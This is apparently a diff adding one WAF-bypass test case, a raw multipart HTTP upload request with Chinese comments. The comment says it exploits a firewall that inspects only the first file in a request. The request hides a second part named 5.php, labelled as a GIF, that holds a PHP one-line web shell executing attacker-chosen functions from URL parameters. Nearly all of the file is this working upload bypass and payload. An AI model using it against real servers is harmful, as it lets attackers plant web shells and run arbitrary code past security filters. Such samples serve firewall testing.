@@ -1,0 +1,22 @@
+# upload_bypass_畸形表单11
+# 利用在同一个包中包含两个或多个文件，只读取前一个文件的缺陷进行绕过
+POST /?bid=hd_tag_m8mv23tc HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23tc
+RM-PRO-Token: a9c2a5c3af976eb5eb87391e2b697ef1
+RM-PRO-Time: 1742808343401
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=aabbxxyy
+
+--aabbxxyy
+Content-Disposition: form-data; name=file; filename=1.gif
+Content-Type:  image/jpeg
+
+
+--aabbxxyy
+--aabbxxyy
+Content-Disposition: form-data; name=file; filename=5.php
+Content-Type: image/gif
+
+<?php $_GET[a]($_GET[b]);?>
+--aabbxxyy--
